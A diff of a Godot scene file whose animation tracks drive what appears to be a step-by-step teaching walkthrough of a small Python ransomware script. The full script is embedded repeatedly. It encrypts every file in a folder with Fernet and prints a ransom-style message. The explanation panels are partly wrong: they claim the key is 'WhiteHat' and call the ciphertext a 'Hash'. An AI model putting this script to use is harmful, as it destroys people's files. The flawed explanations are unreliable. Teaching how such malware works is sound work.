@@ -1049,10 +1193,10 @@ tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:
 tracks/3/interp = 1
 tracks/3/loop_wrap = true
 tracks/3/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0.06666667, 0.73333335),
+"transitions": PackedFloat32Array(1, 1),
 "update": 1,
-"values": ["Collecting Files"]
+"values": ["Collecting Files", "Collecting Files"]
 }
 tracks/4/type = "value"
 tracks/4/imported = false
@@ -1061,10 +1205,10 @@ tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:sha
 tracks/4/interp = 1
 tracks/4/loop_wrap = true
 tracks/4/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0.06666667, 1.0333333),
+"transitions": PackedFloat32Array(1, 1),
 "update": 0,
-"values": [Vector2(0.135, 3.22)]
+"values": [Vector2(0.135, 2.635), Vector2(0.135, 3.22)]
 }
 tracks/5/type = "value"
 tracks/5/imported = false
@@ -1073,10 +1217,10 @@ tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:sha
 tracks/5/interp = 1
 tracks/5/loop_wrap = true
 tracks/5/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0.06666667, 1.0333333),
+"transitions": PackedFloat32Array(1, 1),
 "update": 0,
-"values": [Vector2(3.735, 0.315)]
+"values": [Vector2(3.735, 0.625), Vector2(3.735, 0.315)]
 }
 tracks/6/type = "value"
 tracks/6/imported = false
@@ -1085,14 +1229,15 @@ tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/Code
 tracks/6/interp = 1
 tracks/6/loop_wrap = true
 tracks/6/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0.06666667, 1.0333333),
+"transitions": PackedFloat32Array(1, 1),
 "update": 0,
-"values": [0.0]
+"values": [0.0, 0.0]
 }
 
 [sub_resource type="Animation" id="Animation_de0th"]
 resource_name = "ransomware_step_08"
+length = 2.0
 tracks/0/type = "value"
 tracks/0/imported = false
 tracks/0/enabled = true
@@ -1100,10 +1245,32 @@ tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/Code
 tracks/0/interp = 1
 tracks/0/loop_wrap = true
 tracks/0/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0, 1),
+"transitions": PackedFloat32Array(1, 1),
 "update": 1,
 "values": ["import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
+print('All your files have been encrypted')", "import os from cryptography.fernet 
 import fernet
 
 allfiles = [ ]
@@ -1134,10 +1301,10 @@ tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
 tracks/1/interp = 1
 tracks/1/loop_wrap = true
 tracks/1/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0, 1),
+"transitions": PackedFloat32Array(1, 1),
 "update": 1,
-"values": [true]
+"values": [true, true]
 }
 tracks/2/type = "value"
 tracks/2/imported = false
@@ -1146,10 +1313,10 @@ tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/
 tracks/2/interp = 1
 tracks/2/loop_wrap = true
 tracks/2/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0, 0.8),
+"transitions": PackedFloat32Array(1, 1),
 "update": 1,
-"values": ["The program creates a special secret key (like a password) using Fernet.generate_key(). Normally, it’s a bunch of random characters, but here it’s set to \"WhiteHat\".
+"values": ["Finally, the list is printed out so we can see which files are going to be encrypted.", "The program creates a special secret key (like a password) using Fernet.generate_key(). Normally, it’s a bunch of random characters, but here it’s set to \"WhiteHat\".
 
 This secret key works like a lock-and-key system: it locks the files so nobody can read them, and the same key is needed later to unlock them. Without the key, the locked files are just gibberish — completely useless to anyone. It’s like putting all your important papers in a safe. 
 
@@ -1162,10 +1329,10 @@ tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:
 tracks/3/interp = 1
 tracks/3/loop_wrap = true
 tracks/3/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0, 0.8),
+"transitions": PackedFloat32Array(1, 1),
 "update": 1,
-"values": ["Creating the Password Key"]
+"values": ["Collecting Files", "Creating the Password Key"]
 }
 tracks/4/type = "value"
 tracks/4/imported = false
@@ -1174,10 +1341,10 @@ tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:sha
 tracks/4/interp = 1
 tracks/4/loop_wrap = true
 tracks/4/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0, 1),
+"transitions": PackedFloat32Array(1, 1),
 "update": 0,
-"values": [Vector2(0.1, 0.115)]
+"values": [Vector2(0.135, 3.22), Vector2(0.1, 0.115)]
 }
 tracks/5/type = "value"
 tracks/5/imported = false
@@ -1186,10 +1353,10 @@ tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:sha
 tracks/5/interp = 1
 tracks/5/loop_wrap = true
 tracks/5/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0, 1),
+"transitions": PackedFloat32Array(1, 1),
 "update": 0,
-"values": [Vector2(3.735, 0.315)]
+"values": [Vector2(3.735, 0.315), Vector2(3.735, 0.315)]
 }
 tracks/6/type = "value"
 tracks/6/imported = false
@@ -1198,14 +1365,15 @@ tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/Code
 tracks/6/interp = 1
 tracks/6/loop_wrap = true
 tracks/6/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0, 1.2666667),
+"transitions": PackedFloat32Array(1, 1),
 "update": 0,
-"values": [13.965]
+"values": [0.0, 13.965]
 }
 
 [sub_resource type="Animation" id="Animation_31cwg"]
 resource_name = "ransomware_step_09"
+length = 2.0
 tracks/0/type = "value"
 tracks/0/imported = false
 tracks/0/enabled = true
@@ -1213,10 +1381,32 @@ tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/Code
 tracks/0/interp = 1
 tracks/0/loop_wrap = true
 tracks/0/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(5.9604645e-08, 1.0833334),
+"transitions": PackedFloat32Array(1, 1),
 "update": 1,
 "values": ["import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
+print('All your files have been encrypted')", "import os from cryptography.fernet 
 import fernet
 
 allfiles = [ ]
@@ -1247,10 +1437,10 @@ tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
 tracks/1/interp = 1
 tracks/1/loop_wrap = true
 tracks/1/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(5.9604645e-08, 1.0833334),
+"transitions": PackedFloat32Array(1, 1),
 "update": 1,
-"values": [true]
+"values": [true, true]
 }
 tracks/2/type = "value"
 tracks/2/imported = false
@@ -1259,10 +1449,14 @@ tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/
 tracks/2/interp = 1
 tracks/2/loop_wrap = true
 tracks/2/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(5.9604645e-08, 0.8),
+"transitions": PackedFloat32Array(1, 1),
 "update": 1,
-"values": ["The program then saves this key into a file called key.key, using binary write mode (wb).
+"values": ["The program creates a special secret key (like a password) using Fernet.generate_key(). Normally, it’s a bunch of random characters, but here it’s set to \"WhiteHat\".
+
+This secret key works like a lock-and-key system: it locks the files so nobody can read them, and the same key is needed later to unlock them. Without the key, the locked files are just gibberish — completely useless to anyone. It’s like putting all your important papers in a safe. 
+
+The \"WhiteHat\" key is the only key that can unlock the files. Without it, the files may be locked and unusable because they are encrypted.", "The program then saves this key into a file called key.key, using binary write mode (wb).
 
 At this stage, the program has created the “master key” and stored it safely in a separate file."]
 }
@@ -1273,10 +1467,10 @@ tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:
 tracks/3/interp = 1
 tracks/3/loop_wrap = true
 tracks/3/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(5.9604645e-08, 0.8),
+"transitions": PackedFloat32Array(1, 1),
 "update": 1,
-"values": ["Creating the Password Key"]
+"values": ["Creating the Password Key", "Creating the Password Key"]
 }
 tracks/4/type = "value"
 tracks/4/imported = false
@@ -1285,10 +1479,10 @@ tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:sha
 tracks/4/interp = 1
 tracks/4/loop_wrap = true
 tracks/4/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(5.9604645e-08, 1.0833334),
+"transitions": PackedFloat32Array(1, 1),
 "update": 0,
-"values": [Vector2(0.1, 0.43)]
+"values": [Vector2(0.1, 0.115), Vector2(0.1, 0.43)]
 }
 tracks/5/type = "value"
 tracks/5/imported = false
@@ -1297,10 +1491,10 @@ tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:sha
 tracks/5/interp = 1
 tracks/5/loop_wrap = true
 tracks/5/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(5.9604645e-08, 1.0833334),
+"transitions": PackedFloat32Array(1, 1),
 "update": 0,
-"values": [Vector2(3.735, 0.6)]
+"values": [Vector2(3.735, 0.315), Vector2(3.735, 0.6)]
 }
 tracks/6/type = "value"
 tracks/6/imported = false
@@ -1309,14 +1503,15 @@ tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/Code
 tracks/6/interp = 1
 tracks/6/loop_wrap = true
 tracks/6/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0.2666667, 1.0833334),
+"transitions": PackedFloat32Array(1, 1),
 "update": 0,
-"values": [13.965]
+"values": [13.965, 13.965]
 }
 
 [sub_resource type="Animation" id="Animation_x5n46"]
 resource_name = "ransomware_step_10"
+length = 2.0
 tracks/0/type = "value"
 tracks/0/imported = false
 tracks/0/enabled = true
@@ -1324,10 +1519,32 @@ tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/Code
 tracks/0/interp = 1
 tracks/0/loop_wrap = true
 tracks/0/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0, 1),
+"transitions": PackedFloat32Array(1, 1),
 "update": 1,
 "values": ["import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
+print('All your files have been encrypted')", "import os from cryptography.fernet 
 import fernet
 
 allfiles = [ ]
@@ -1358,10 +1575,10 @@ tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
 tracks/1/interp = 1
 tracks/1/loop_wrap = true
 tracks/1/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0, 1),
+"transitions": PackedFloat32Array(1, 1),
 "update": 1,
-"values": [true]
+"values": [true, true]
 }
 tracks/2/type = "value"
 tracks/2/imported = false
@@ -1370,10 +1587,12 @@ tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/
 tracks/2/interp = 1
 tracks/2/loop_wrap = true
 tracks/2/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(-0.01666665, 0.9),
+"transitions": PackedFloat32Array(1, 1),
 "update": 1,
-"values": ["Here’s where the real work happens:
+"values": ["The program then saves this key into a file called key.key, using binary write mode (wb).
+
+At this stage, the program has created the “master key” and stored it safely in a separate file.", "Here’s where the real work happens:
 
 The program loops through every file in the allfiles list.
 
@@ -1386,10 +1605,10 @@ tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:
 tracks/3/interp = 1
 tracks/3/loop_wrap = true
 tracks/3/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(-0.01666665, 0.9),
+"transitions": PackedFloat32Array(1, 1),
 "update": 1,
-"values": ["Encrypting the Files"]
+"values": ["Creating the Password Key", "Encrypting the Files"]
 }
 tracks/4/type = "value"
 tracks/4/imported = false
@@ -1398,10 +1617,10 @@ tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:sha
 tracks/4/interp = 1
 tracks/4/loop_wrap = true
 tracks/4/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0, 1),
+"transitions": PackedFloat32Array(1, 1),
 "update": 0,
-"values": [Vector2(0.1, 1.41)]
+"values": [Vector2(0.1, 0.43), Vector2(0.1, 1.41)]
 }
 tracks/5/type = "value"
 tracks/5/imported = false
@@ -1410,10 +1629,10 @@ tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:sha
 tracks/5/interp = 1
 tracks/5/loop_wrap = true
 tracks/5/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0, 1),
+"transitions": PackedFloat32Array(1, 1),
 "update": 0,
-"values": [Vector2(3.735, 0.855)]
+"values": [Vector2(3.735, 0.6), Vector2(3.735, 0.855)]
 }
 tracks/6/type = "value"
 tracks/6/imported = false
@@ -1422,10 +1641,10 @@ tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/Code
 tracks/6/interp = 1
 tracks/6/loop_wrap = true
 tracks/6/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0, 1),
+"transitions": PackedFloat32Array(1, 1),
 "update": 0,
-"values": [13.965]
+"values": [13.965, 13.965]
 }
 
 [sub_resource type="Animation" id="Animation_x2hu1"]
@@ -1437,10 +1656,32 @@ tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/Code
 tracks/0/interp = 1
 tracks/0/loop_wrap = true
 tracks/0/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0, 1),
+"transitions": PackedFloat32Array(1, 1),
 "update": 1,
 "values": ["import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
+print('All your files have been encrypted')", "import os from cryptography.fernet 
 import fernet
 
 allfiles = [ ]
@@ -1471,10 +1712,10 @@ tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
 tracks/1/interp = 1
 tracks/1/loop_wrap = true
 tracks/1/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0, 1),
+"transitions": PackedFloat32Array(1, 1),
 "update": 1,
-"values": [true]
+"values": [true, true]
 }
 tracks/2/type = "value"
 tracks/2/imported = false
@@ -1483,10 +1724,14 @@ tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/
 tracks/2/interp = 1
 tracks/2/loop_wrap = true
 tracks/2/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0.01666665, 0.8666667),
+"transitions": PackedFloat32Array(1, 1),
 "update": 1,
-"values": ["That data is then fed into Fernet(key).encrypt(), which scrambles the content into a completely unreadable format (Hash)."]
+"values": ["Here’s where the real work happens:
+
+The program loops through every file in the allfiles list.
+
+Each file is opened in binary read mode (rb) so the raw data can be read.", "That data is then fed into Fernet(key).encrypt(), which scrambles the content into a completely unreadable format (Hash)."]
 }
 tracks/3/type = "value"
 tracks/3/imported = false
@@ -1495,10 +1740,10 @@ tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:
 tracks/3/interp = 1
 tracks/3/loop_wrap = true
 tracks/3/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0.01666665, 0.8666667),
+"transitions": PackedFloat32Array(1, 1),
 "update": 1,
-"values": ["Encrypting the Files"]
+"values": ["Encrypting the Files", "Encrypting the Files"]
 }
 tracks/4/type = "value"
 tracks/4/imported = false
@@ -1507,10 +1752,10 @@ tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:sha
 tracks/4/interp = 1
 tracks/4/loop_wrap = true
 tracks/4/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0, 1),
+"transitions": PackedFloat32Array(1, 1),
 "update": 0,
-"values": [Vector2(0.1, 2.29)]
+"values": [Vector2(0.1, 1.41), Vector2(0.1, 2.29)]
 }
 tracks/5/type = "value"
 tracks/5/imported = false
@@ -1519,10 +1764,10 @@ tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:sha
 tracks/5/interp = 1
 tracks/5/loop_wrap = true
 tracks/5/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0, 1),
+"transitions": PackedFloat32Array(1, 1),
 "update": 0,
-"values": [Vector2(3.735, 0.3)]
+"values": [Vector2(3.735, 0.855), Vector2(3.735, 0.3)]
 }
 tracks/6/type = "value"
 tracks/6/imported = false
@@ -1531,10 +1776,10 @@ tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/Code
 tracks/6/interp = 1
 tracks/6/loop_wrap = true
 tracks/6/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0, 1),
+"transitions": PackedFloat32Array(1, 1),
 "update": 0,
-"values": [13.965]
+"values": [13.965, 13.965]
 }
 
 [sub_resource type="Animation" id="Animation_8yhgl"]
@@ -1546,10 +1791,32 @@ tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/Code
 tracks/0/interp = 1
 tracks/0/loop_wrap = true
 tracks/0/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0, 1),
+"transitions": PackedFloat32Array(1, 1),
 "update": 1,
 "values": ["import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
+print('All your files have been encrypted')", "import os from cryptography.fernet 
 import fernet
 
 allfiles = [ ]
@@ -1580,10 +1847,10 @@ tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
 tracks/1/interp = 1
 tracks/1/loop_wrap = true
 tracks/1/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0, 1),
+"transitions": PackedFloat32Array(1, 1),
 "update": 1,
-"values": [true]
+"values": [true, true]
 }
 tracks/2/type = "value"
 tracks/2/imported = false
@@ -1592,10 +1859,10 @@ tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/
 tracks/2/interp = 1
 tracks/2/loop_wrap = true
 tracks/2/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0, 0.8666667),
+"transitions": PackedFloat32Array(1, 1),
 "update": 1,
-"values": ["Finally, the encrypted version replaces the original file by writing it back in binary write mode (wb).
+"values": ["That data is then fed into Fernet(key).encrypt(), which scrambles the content into a completely unreadable format (Hash).", "Finally, the encrypted version replaces the original file by writing it back in binary write mode (wb).
 
 At this point, the files are no longer usable in their normal form — they have been locked with the password key."]
 }
@@ -1606,10 +1873,10 @@ tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:
 tracks/3/interp = 1
 tracks/3/loop_wrap = true
 tracks/3/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0, 0.8666667),
+"transitions": PackedFloat32Array(1, 1),
 "update": 1,
-"values": ["Encrypting the Files"]
+"values": ["Encrypting the Files", "Encrypting the Files"]
 }
 tracks/4/type = "value"
 tracks/4/imported = false
@@ -1618,10 +1885,10 @@ tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:sha
 tracks/4/interp = 1
 tracks/4/loop_wrap = true
 tracks/4/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0, 1),
+"transitions": PackedFloat32Array(1, 1),
 "update": 0,
-"values": [Vector2(0.1, 2.615)]
+"values": [Vector2(0.1, 2.29), Vector2(0.1, 2.615)]
 }
 tracks/5/type = "value"
 tracks/5/imported = false
@@ -1630,10 +1897,10 @@ tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:sha
 tracks/5/interp = 1
 tracks/5/loop_wrap = true
 tracks/5/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0, 1),
+"transitions": PackedFloat32Array(1, 1),
 "update": 0,
-"values": [Vector2(3.735, 0.59)]
+"values": [Vector2(3.735, 0.3), Vector2(3.735, 0.59)]
 }
 tracks/6/type = "value"
 tracks/6/imported = false
@@ -1642,14 +1909,15 @@ tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/Code
 tracks/6/interp = 1
 tracks/6/loop_wrap = true
 tracks/6/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0, 1),
+"transitions": PackedFloat32Array(1, 1),
 "update": 0,
-"values": [13.965]
+"values": [13.965, 13.965]
 }
 
 [sub_resource type="Animation" id="Animation_h0h0r"]
 resource_name = "ransomware_step_13"
+length = 2.0
 tracks/0/type = "value"
 tracks/0/imported = false
 tracks/0/enabled = true
@@ -1657,10 +1925,32 @@ tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/Code
 tracks/0/interp = 1
 tracks/0/loop_wrap = true
 tracks/0/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0, 1),
+"transitions": PackedFloat32Array(1, 1),
 "update": 1,
 "values": ["import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
+print('All your files have been encrypted')", "import os from cryptography.fernet 
 import fernet
 
 allfiles = [ ]
@@ -1691,10 +1981,10 @@ tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
 tracks/1/interp = 1
 tracks/1/loop_wrap = true
 tracks/1/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0, 1),
+"transitions": PackedFloat32Array(1, 1),
 "update": 1,
-"values": [true]
+"values": [true, true]
 }
 tracks/2/type = "value"
 tracks/2/imported = false
@@ -1703,10 +1993,12 @@ tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/
 tracks/2/interp = 1
 tracks/2/loop_wrap = true
 tracks/2/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0, 0.9),
+"transitions": PackedFloat32Array(1, 1),
 "update": 1,
-"values": ["The program prints a message to confirm that all the files have been encrypted."]
+"values": ["Finally, the encrypted version replaces the original file by writing it back in binary write mode (wb).
+
+At this point, the files are no longer usable in their normal form — they have been locked with the password key.", "The program prints a message to confirm that all the files have been encrypted."]
 }
 tracks/3/type = "value"
 tracks/3/imported = false
@@ -1715,10 +2007,10 @@ tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:
 tracks/3/interp = 1
 tracks/3/loop_wrap = true
 tracks/3/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0, 0.9),
+"transitions": PackedFloat32Array(1, 1),
 "update": 1,
-"values": ["Final Confirmation"]
+"values": ["Encrypting the Files", "Encryption Complete"]
 }
 tracks/4/type = "value"
 tracks/4/imported = false
@@ -1727,10 +2019,10 @@ tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:sha
 tracks/4/interp = 1
 tracks/4/loop_wrap = true
 tracks/4/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0, 1),
+"transitions": PackedFloat32Array(1, 1),
 "update": 0,
-"values": [Vector2(0.1, 3.555)]
+"values": [Vector2(0.1, 2.615), Vector2(0.1, 3.555)]
 }
 tracks/5/type = "value"
 tracks/5/imported = false
@@ -1739,10 +2031,10 @@ tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:sha
 tracks/5/interp = 1
 tracks/5/loop_wrap = true
 tracks/5/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0, 1),
+"transitions": PackedFloat32Array(1, 1),
 "update": 0,
-"values": [Vector2(3.735, 0.28)]
+"values": [Vector2(3.735, 0.59), Vector2(3.735, 0.28)]
 }
 tracks/6/type = "value"
 tracks/6/imported = false
@@ -1751,10 +2043,22 @@ tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/Code
 tracks/6/interp = 1
 tracks/6/loop_wrap = true
 tracks/6/keys = {
+"times": PackedFloat32Array(0, 1),
+"transitions": PackedFloat32Array(1, 1),
+"update": 0,
+"values": [13.965, 13.965]
+}
+tracks/7/type = "value"
+tracks/7/imported = false
+tracks/7/enabled = true
+tracks/7/path = NodePath("WindowBackground:visible")
+tracks/7/interp = 1
+tracks/7/loop_wrap = true
+tracks/7/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
-"update": 0,
-"values": [13.965]
+"update": 1,
+"values": [false]
 }
 
 [sub_resource type="Animation" id="Animation_8fnya"]
@@ -1939,6 +2243,128 @@ tracks/12/keys = {
 "values": [true]
 }
 
+[sub_resource type="Animation" id="Animation_vuwby"]
+resource_name = "ransomware_step_14"
+length = 2.0
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
